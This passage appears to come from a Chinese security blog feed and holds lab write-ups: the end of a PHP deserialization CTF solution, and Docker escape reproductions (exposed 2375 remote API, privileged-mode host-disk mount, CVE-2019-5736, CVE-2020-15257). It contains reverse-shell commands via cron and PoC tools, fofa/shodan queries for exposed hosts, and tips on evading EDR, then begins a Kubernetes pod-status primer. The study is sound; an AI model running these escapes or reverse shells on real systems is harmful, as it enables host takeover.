class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里Polar1等于Polar2 Night=Light  随机100，因为每次请求值都是会变得。所以并不是100*100的可能性，而是比这可能性小的多<br>所以还是引用变量覆盖,这里要把属性设置为public。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Polar1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Polar2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Night</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Light</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$flag</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Polar2</span> = rand(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$Polar2</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;-----&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;Polar1 === <span class="keyword">$this</span>-&gt;Polar2)&#123;</span><br><span class="line">            <span class="variable">$Light</span> = rand(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$Light</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;Night === <span class="keyword">$this</span>-&gt;Light)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your wrong!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;getflag(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="string">&quot;suiji.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;----------------&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Index();</span><br><span class="line"><span class="variable">$a</span>-&gt;Polar1=&amp;<span class="variable">$a</span>-&gt;Polar2;</span><br><span class="line"><span class="variable">$a</span>-&gt;Night=&amp;<span class="variable">$a</span>-&gt;Light;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>k8s学习及漏洞复现-下</title>
      <link href="/2024/01/10/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E4%B8%8B/"/>
      <url>/2024/01/10/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<h6 id="1-1docker-remote-api-2375"><a href="#1-1docker-remote-api-2375" class="headerlink" title="1.1docker remote api (2375)"></a>1.1docker remote api (2375)</h6><p>k8s与docker总是并行出现的，那么如果docker出现问题，也将是严重的。这里笔者学习复现一下docker的漏洞，docker远程访问漏洞。<br><code>fofa指纹app=&quot;docker-Daemon&quot; shodan **port:”2375″ country:”JP” Docker**</code><br>测试是否存在漏洞，这里可以看到，fofa出来的并不是都是2375端口，也可能是附近的，都一样，正常是404，然后加个version，或者<code>2376/containers/json</code>出现信息，也可证明存在漏洞<br><img src="/images/k8s/image-20240111103740807.png" alt="image-20240111103740807"></p><p><img src="/images/k8s/image-20240111103917111.png" alt="image-20240111103917111"></p><p><img src="/images/k8s/image-20240111104146653.png" alt="image-20240111104146653"></p><p>也可以使用命令进行获取到相关容器。</p><p><img src="/images/k8s/image-20240111141859943.png" alt="image-20240111141859943"></p><h6 id="1-2搭建本地漏洞"><a href="#1-2搭建本地漏洞" class="headerlink" title="1.2搭建本地漏洞"></a>1.2搭建本地漏洞</h6><p>接下来的操作没有授权，就搭建了一个环境，使用vulhub搭建，很方便。<code>https://github.com/vulhub/vulhub</code>，安装完docker即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /vulhub/docker/unauthorized-rce</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>这里我们pull一个镜像，这里报了一个错，Using default tag: latest<br>Error response from daemon: missing signature key，大概意思是本机docker版本低或者高，镜像版本低或者高，然后镜像和docker不匹配不兼容，那么很好解决，简单解决方法去hub.docker.com，搜一下镜像，然后拉去低版本的，复杂的，更新docker。</p><h6 id="1-3利用过程"><a href="#1-3利用过程" class="headerlink" title="1.3利用过程"></a>1.3利用过程</h6><p><img src="/images/k8s/image-20240111143119711.png" alt="image-20240111143119711"></p><p><img src="/images/k8s/image-20240111143520435.png" alt="image-20240111143520435"></p><p><img src="/images/k8s/image-20240111143543713.png" alt="image-20240111143543713"></p><p>加上版本号在pull即可，这里不一定必须要拉这个，其他的也一样用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://192.168.241.142:2375 run -it --privileged busybox:1.27.0  /bin/sh</span><br><span class="line"></span><br><span class="line">#在kali中启动一个有交互的shell，并且是特权镜像</span><br><span class="line">#当操作者执行docker run —privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。</span><br><span class="line">也就是常说的特权模式。</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240111144005712.png" alt="image-20240111144005712"></p><h6 id="1-4特权模式逃逸"><a href="#1-4特权模式逃逸" class="headerlink" title="1.4特权模式逃逸"></a>1.4特权模式逃逸</h6><p>然后在进行逃逸即可。最简单的，挂载主机硬盘。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># mkdir bohemian</span></span><br><span class="line">/ <span class="comment"># mount /dev/vda1 /bohemian</span></span><br><span class="line">/ <span class="comment"># ls /bohemian</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment">#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span></span><br><span class="line">bash -c <span class="string">&quot;bash -i  &gt;&amp;/dev/tcp/192.168.241.128/6666 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chmod +x s.sh </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*/1 * * * *  /bohemian/s.sh&#x27;</span> &gt;&gt; /bohemian/var/spool/cron/crontabs/root <span class="comment">#每分钟执行一次 文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者passwd写用户也是常见的写后门的一种方法</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">值得一提的是</span><br><span class="line"></span><br><span class="line">从对抗的层面上，不建议将逃逸的行为当成可以写入宿主机特定文件 (如 /etc/cron*, /root/.ssh/authorized_keys 等文件) 的行为，应该根据目标选择更趋近与业务行为的手法，容器逃逸的利用手段会比大部分情况下的命令执行漏洞利用要灵活。</span><br><span class="line"></span><br><span class="line">以目标 “获取宿主机上的配置文件” 为例，以下几种逃逸手法在容易在防御团队中暴露的概率从大到小，排序如下(部分典型手法举例，不同的 EDR 情况不同)：</span><br><span class="line"></span><br><span class="line">mount /etc + write crontab</span><br><span class="line">mount /root/.ssh + write authorized_keys</span><br><span class="line">old CVE/vulnerability exploit</span><br><span class="line">write cgroup notify_on_release</span><br><span class="line">write procfs core_pattern</span><br><span class="line">volumeMounts: / + chroot</span><br><span class="line">remount and rewrite cgroup</span><br><span class="line">websocket/sock shell + volumeMounts: /path</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240111144206581.png" alt="image-20240111144206581"></p><p><img src="/images/k8s/image-20240111150221566.png" alt="image-20240111150221566"></p><h6 id="1-6总结："><a href="#1-6总结：" class="headerlink" title="1.6总结："></a>1.6总结：</h6><p>个人感觉在实战中，这个未授权出现的不多了，fofa后，访问了几个20个感觉有五个左右。</p><h5 id="2-docker-runC容器逃逸-CVE-2019-5736复现"><a href="#2-docker-runC容器逃逸-CVE-2019-5736复现" class="headerlink" title="2.docker:runC容器逃逸-CVE-2019-5736复现"></a>2.<strong>docker:runC容器逃逸-CVE-2019-5736复现</strong></h5><h6 id="2-1漏洞原理"><a href="#2-1漏洞原理" class="headerlink" title="2.1漏洞原理"></a>2.1漏洞原理</h6><p>漏洞点在于runC，RunC是一个容器运行时，最初是作为Docker的一部分开发的，后来作为一个单独的开源工具和库被提取出来。作为“低级别”容器运行时，runC主要由“高级别”容器运行时（例如Docker）用于生成和运行容器，尽管它可以用作独立工具。像Docker这样的“高级别”容器运行时通常会实现镜像创建和管理等功能，并且可以使用runC来处理与运行容器相关的任务：创建容器、将进程附加到现有容器等。在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。</p><h6 id="2-2环境部署"><a href="#2-2环境部署" class="headerlink" title="2.2环境部署"></a>2.2环境部署</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metarget cnv install cve-2019-5736</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240112143301977.png" alt="image-20240112143301977"></p><h6 id="2-3漏洞影响版本"><a href="#2-3漏洞影响版本" class="headerlink" title="2.3漏洞影响版本"></a>2.3漏洞影响版本</h6><ul><li><p>runC &lt; 1.0-rc6 （docker &lt; 18.09.2）</p></li><li><p><img src="/images/k8s/image-20240112144834221.png" alt="image-20240112144834221"></p></li></ul><h6 id="2-4利用条件"><a href="#2-4利用条件" class="headerlink" title="2.4利用条件"></a>2.4利用条件</h6><p>需要在容器内具有 root 权限，才能覆盖runC文件，可能需要配合钓鱼等等手法，让对面的管理员执行命令进入容器，也就是<code>docker run -it ubuntu /bin/bash</code>，</p><h6 id="2-5利用过程"><a href="#2-5利用过程" class="headerlink" title="2.5利用过程"></a>2.5利用过程</h6><p>然后的利用流程是，拉去一个Ubuntu的镜像，默认metarget帮我们拉好了，<br>然后·<code>docker run -it ubuntu /bin/bash</code>起一个镜像，<br>另起一个终端，<code>docker ps</code>,看一下containerid<br>这里起容器的时候注意，要加-it，如果想后台运行的话，也要加-d，不然exit后会退出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-d: 后台运行容器，并返回容器ID；</span><br><span class="line">-i: 以交互模式运行容器，通常与 -t 同时使用；</span><br><span class="line">-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240115153503004.png" alt="image-20240115153503004"></p><p>去这里下载一下poc,用go编译，注意这里这个poc不需要将payload放在文件中，利用的时候直接终端中获取。</p><p><code>https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go</code></p><p>模拟获取到容器的权限，然后上传poc。</p><p><code>docker cp cve-2019-5736 7a6c5438f435:/</code></p><p>加一个权限，然后执行要执行的命令就可</p><p><code>./cve-2019-5736 -shell &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2233 0&gt;&amp;1&quot;</code></p><p><img src="/images/k8s/image-20240115171916605.png" alt="image-20240115171916605"></p><p><img src="/images/k8s/image-20240115171940936.png" alt="image-20240115171940936"></p><p><img src="/images/k8s/image-20240115172023103.png" alt="image-20240115172023103"></p><p>同时vps监听，这里一定要注意，笔者在第一次测试的时候输错了命令，然后，再去想执行其他命令的时候，会报错，也就是，可能docker-runc这个组件被打崩了。</p><p>执行<code>tail -c 100 /usr/bin/docker-runc | xxd</code>可以看到，runc被更改了。</p><p><img src="/images/k8s/image-20240115172218627.png" alt="image-20240115172218627"></p><p>runc崩了，就进不去容器了</p><p><img src="/images/k8s/image-20240112160934960.png" alt="image-20240112160934960"></p><h6 id="2-6总结"><a href="#2-6总结" class="headerlink" title="2.6总结"></a>2.6总结</h6><p>漏洞的实现难点在于，需要在宿主主机上执行一下进入可控容器的步骤，这一步实现起来相对比较难。<br>还有就是，实战中如果真的条件允许的话，runc会被更改，可能会影响业务，这是很难受的。</p><h5 id="3-CVE-2020-15257-host模式容器逃逸漏洞"><a href="#3-CVE-2020-15257-host模式容器逃逸漏洞" class="headerlink" title="3.CVE-2020-15257-host模式容器逃逸漏洞"></a>3.CVE-2020-15257-host模式容器逃逸漏洞</h5><h6 id="3-1前置知识：docker网络-Docker配置不当导致的容器逃逸"><a href="#3-1前置知识：docker网络-Docker配置不当导致的容器逃逸" class="headerlink" title="3.1前置知识：docker网络,Docker配置不当导致的容器逃逸"></a>3.1前置知识：docker网络,Docker配置不当导致的容器逃逸</h6><p>这里我们再次提到NameSpace和cgroups</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Linux 命名空间（NameSpace）：实现文件系统、网络、进程、主机名等方面的隔离</span><br><span class="line">Linux 控制组（cgroups）：实现 CPU、内存、硬盘等方面的隔离</span><br></pre></td></tr></table></figure><p>如果设定了以下配置就会导致相应的隔离机制失效：</p><p>其实原理很简单,就是通过权限的变更打破了原来的文件系统、网络、进程、主机名等方面的隔离</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破</span><br><span class="line"></span><br><span class="line">--net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破</span><br><span class="line"></span><br><span class="line">--pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破</span><br><span class="line"></span><br><span class="line">--volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破</span><br></pre></td></tr></table></figure><p>当你安装完Docker时，它会自动创建三个网络。你可以使用以下<code>docker network ls</code>命令列出这些网络：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network ls</span><br></pre></td></tr></table></figure><p>结果应如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NETWORK ID          NAME                       DRIVER              <span class="keyword">SCOPE</span></span><br><span class="line"><span class="number">92</span>d50b6667c7        bridge                     bridge              <span class="keyword">local</span></span><br><span class="line"><span class="number">01</span>f9f326e362        host                       host                <span class="keyword">local</span></span><br><span class="line"><span class="number">1</span>b3137177ee1        <span class="keyword">none</span>                       <span class="keyword">null</span>                <span class="keyword">local</span></span><br><span class="line">f646c93ba617        unauthorized<span class="operator">-</span>rce_default   bridge              <span class="keyword">local</span></span><br></pre></td></tr></table></figure><p>Docker内置这三个网络，运行容器时，你可以使用该来指定容器应连接到哪些网络。</p><p>我们在使用docker run创建Docker容器时，可以用<code>--network</code>标志 选项指定容器的网络模式，Docker有以下4种网络模式：<br>host模式：使用 –net=host 指定。<br>none模式：使用 –net=none 指定。<br>bridge模式：使用 –net=bridge 指定，默认设置。<br>container模式：使用 –net=container:NAME_or_ID 指定。</p><p>Docker使用了Linux的Namespaces技术来进行资源隔离，如PID Namespace隔离进程，Mount Namespace隔离文件系统，Network Namespace隔离网络等。一个Network Namespace提供了一份独立的网络环境，包括网卡、路由、Iptable规则等都与其他的Network Namespace隔离。</p><p>host模式类似于Vmware的桥接模式，与宿主机在同一个网络中，但没有独立IP地址。一个Docker容器一般会分配一个独立的Network Namespace。但如果启动容器的时候使用host模式，那么这个容器将不会获得一个独立的Network Namespace，而是和宿主机共用一个Network Namespace。容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的IP和端口。</p><p>容器与主机在相同的网络命名空间下面，使用相同的网络协议栈，容器可以直接使用主机的所有网络接口。</p><h6 id="3-2containerd-shim"><a href="#3-2containerd-shim" class="headerlink" title="3.2containerd-shim"></a>3.2containerd-shim</h6><p>在进一步了解漏洞原理之前， 我们需要了解一下啊 <strong>containerd-shim</strong> 是什么？</p><p>在 1.11 版本中，Docker 进行了重大的重构，由单一的 Docker Daemon，拆分成了 4 个独立的模块：Docker Daemon、containerd、containerd-shim、runC</p><p>其中，containerd 是由 Docker Daemon 中的容器运行时及其管理功能剥离了出来。docker 对容器的管理和操作基本都是通过 containerd 完成的。containerd就是docker前面的那个号。</p><p><img src="/images/k8s/image-20240117094901172.png" alt="image-20240117094901172"></p><p>它向上为 Docker Daemon 提供了 gRPC 接口，向下通过 containerd-shim 结合 runC，实现对容器的管理控制。containerd 还提供了可用于与其交互的 API 和客户端应用程序 ctr。所以实际上，即使不运行 Docker Daemon，也能够直接通过 containerd 来运行、管理容器。</p><p>而中间的 <strong>containerd-shim</strong> 夹杂在 containerd 和 runc 之间，每次启动一个容器，都会创建一个新的 containerd-shim 进程，它通过指定的三个参数：容器 id、bundle 目录、运行时二进制文件路径，来调用运行时的 API 创建、运行容器，持续存在到容器实例进程退出为止，将容器的退出状态反馈给 containerd。</p><h6 id="3-3漏洞原理"><a href="#3-3漏洞原理" class="headerlink" title="3.3漏洞原理"></a>3.3漏洞原理</h6><p>由于在 host 模式下，容器与 <strong>host</strong> 共享一套 <strong>Network namespaces</strong> ，此时 <strong>containerd-shim API</strong> 暴露给了用户，而且访问控制仅仅验证了连接进程的有效UID为0，但没有限制对抽象Unix域套接字的访问。所以当一个容器为 root 权限，且容器的网络模式为 <code>--net=host</code> 的时候，通过 <strong>ontainerd-shim API</strong> 可以达成容器逃逸的目的</p><h6 id="3-4漏洞影响版本"><a href="#3-4漏洞影响版本" class="headerlink" title="3.4漏洞影响版本"></a>3.4漏洞影响版本</h6><p>该漏洞影响 containerd 1.3.x, 1.2.x, 1.4.x 版本</p><h6 id="3-5环境搭建"><a href="#3-5环境搭建" class="headerlink" title="3.5环境搭建"></a>3.5环境搭建</h6><p>./metarget cnv install cve-2020-15257</p><p>metarget实现的命令是<br>sudo docker run -it –net=host –name=15257 ubuntu /bin/bash</p><p>我们用<br>docker run -d -it –net=host vulhub/thinkphp:5.0.23，起一个带漏洞的也可以</p><p>./metarget cnv install cve-2020-15257</p><p><img src="/images/k8s/image-20240117104127925.png" alt="image-20240117104127925"></p><p><img src="/images/k8s/image-20240117104149458.png" alt="image-20240117104149458"></p><p>这样就可以模拟漏洞利用然后拿root，然后逃逸了</p><h6 id="3-6漏洞利用"><a href="#3-6漏洞利用" class="headerlink" title="3.6漏洞利用"></a>3.6漏洞利用</h6><p>webshell中也是可判断是否存在抽象命名空间unix域套接字。<br><code>cat /proc/net/unix|grep -a &quot;containerd-shim&quot;</code><br>出现下图中的信息，表示存在抽象命名空间unix域套接字。</p><p><img src="/images/k8s/image-20240117144206246.png" alt="image-20240117144206246"></p><p>从宿主主机进入到容器中</p><p><img src="/images/k8s/image-20240117104701059.png" alt="image-20240117104701059"></p><p>去到这里下载一下大师傅的工具，<a href="https://github.com/cdk-team/CDK/tree/0.1.6%EF%BC%8C%E6%88%91%E8%BF%99%E9%87%8C%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%98%AF%E6%9C%80%E8%80%81%E7%89%88%E6%9C%AC0.1.6%E7%9A%84%EF%BC%8C%E7%94%A8%E6%9C%80%E6%96%B0%E7%89%88%E7%9A%84%E6%8A%A5%E9%94%99%E3%80%82">https://github.com/cdk-team/CDK/tree/0.1.6，我这里下载的是最老版本0.1.6的，用最新版的报错。</a><br>然后先试下如果是webshell的话可不可以，这里经过测试好像是不可以的，会报rpc error: ttrpc: closed<br>可能是权限问题，不太清楚。</p><p><img src="/images/k8s/image-20240117143535014.png" alt="image-20240117143535014"></p><p>回到宿主主机，将cdk_linux_amd64同样传到容器中，<code>docker cp cdk_linux_amd64 ubuntu:18.04:/</code><br>然后加上权限执行，./cdk_linux_amd64 run shim-pwn ip 23333</p><p>nc -lvvnp 23333 监听即可。<img src="/images/k8s/image-20240117144000362.png" alt="image-20240117144000362"></p><p><img src="/images/k8s/image-20240117144044795.png" alt="image-20240117144044795"></p><h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>这个漏洞要符合三个条件，一个就是containerd版本，再就是权限的问题，可能不必须要root，笔者测试的话 。webshell的权限确实没成功。最后一个，就是docker容器环境起来的时候要host模式。</p><h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有错误到或描述不正确的地方，期待业界师傅们指正勘误。本来是研究k8s漏洞的，奈何笔者能力有限，只研究了k8s的未授权简单的漏洞。后续如果有机会的话，在研究其他漏洞吧。</p><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><pre><code>https://bestwing.me/CVE-2020-15257-anaylysis.html  CVE-2020-15257 Docker 逃逸漏洞分析``https://blog.csdn.net/w17791476027/article/details/132637785https://github.com/cdk-team/CDK/tree/0.1.6 工具https://xz.aliyun.com/t/8925?time__1311=n4%2BxuDgDBD90i%3DD7YD8DlP6e0%3D25Zg2iE%2B%2BbD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-5https://www.mylovekiki.top/?p=1033https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Docker/Docker%20%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20%28CVE-2020-15257%29%E5%A4%8D%E7%8E%B0/https://www.cnblogs.com/tomyyyyy/p/16275873.html#tid-mkZRymhttps://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Docker/Docker%20%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20%28CVE-2020-15257%29%E5%A4%8D%E7%8E%B0/https://blog.csdn.net/qq_36197704/article/details/122172877https://m01ly.github.io/2022/01/04/pt-docker-escape/</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>k8s学习及漏洞复现-上</title>
      <link href="/2023/12/25/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E4%B8%8A/"/>
      <url>/2023/12/25/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h4 id="k8s基础知识"><a href="#k8s基础知识" class="headerlink" title="k8s基础知识"></a>k8s基础知识</h4><h5 id="常见的pod状态"><a href="#常见的pod状态" class="headerlink" title="常见的pod状态"></a>常见的pod状态</h5><p><img src="https://pic3.zhimg.com/80/v2-9eb57d02d5fe3b5d16b84e05c60eb6de_720w.webp" alt="img"></p><p>pod</p><p><strong>pod常见的状态</strong>：<br><strong>第一阶段</strong>：<br><strong>挂起（Pending）</strong>：<br>1、正在创建Pod但是Pod中的容器还没有全部被创建完成，处于此状态的Pod应该检查Pod依赖的存储是否有权限挂载、镜像是否可以下载、调度是否正常等<br>2、我们在请求创建pod时，条件不满足，调度没有完成，没有任何一个节点能满足调度条件，已经创建了pod但是没有适合它运行的节点叫做挂起，调度没有完成。</p><p><strong>失败（Failed）</strong>：Pod 中的所有容器都已终止了，并且至少有一个容器是因为失败终止。也就是说，容器以非0状态退出或者被系统终止。<br><strong>未知（Unknown）</strong>：未知状态，所谓pod是什么状态是apiserver和运行在pod节点的kubelet进行通信获取状态信息的，如果节点之上的kubelet本身出故障，那么apiserver就连不上kubelet，得不到信息了，就会看Unknown，通常是由于与pod所在的node节点通信错误。</p><p><strong>Error 状态</strong>：Pod 启动过程中发生了错误</p><p><strong>成功（Succeeded）</strong>：Pod中的所有容器都被成功终止，即pod里所有的containers均已terminated。</p><p><strong>已终止（Terminated）</strong> 处于Terminated状态的容器已经开始执行并且或者正常结束或者因为某些原因失败。 如果你使用kubectl来查询包含Terminated状态的容器的 Pod 时， 你会看到容器进入此状态的原因、退出代码以及容器执行期间的起止时间</p><p><strong>第二阶段</strong>：<br><strong>Unschedulable</strong>：Pod不能被调度， scheduler没有匹配到合适的node节点<br><strong>PodScheduled</strong>：pod正处于调度中，在scheduler刚开始调度的时候，还没有将pod分配到指定的node，在筛选出合适的节点后就会更新etcd数据，将pod分配到指定的node<br><strong>Initialized</strong>：所有pod中的初始化容器已经完成了<br><strong>ImagePullBackOff</strong>：Pod所在的node节点下载镜像失败<br><strong>Running</strong>：Pod内部的容器已经被创建并且启动。</p><p>扩展：还有其他状态，如下：<br><strong>Evicted</strong>状态：出现这种情况，多见于系统内存或硬盘资源不足，可df-h查看docker存储所在目录的资源使用情况，如果百分比大于85%，就要及时清理下资源，尤其是一些大文件、docker镜像。<br><strong>CrashLoopBackOff</strong>：容器曾经启动了，但可能又异常退出了</p><h4 id="k8s-漏洞环境搭建"><a href="#k8s-漏洞环境搭建" class="headerlink" title="k8s-漏洞环境搭建"></a>k8s-漏洞环境搭建</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#麻省理工大学ubuntu20 源</span></span><br><span class="line">deb http://mirrors.mit.edu/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.mit.edu/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb http://mirrors.mit.edu/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.mit.edu/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.mit.edu/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.mit.edu/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.mit.edu/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.mit.edu/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.mit.edu/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.mit.edu/ubuntu/ focal-backports main 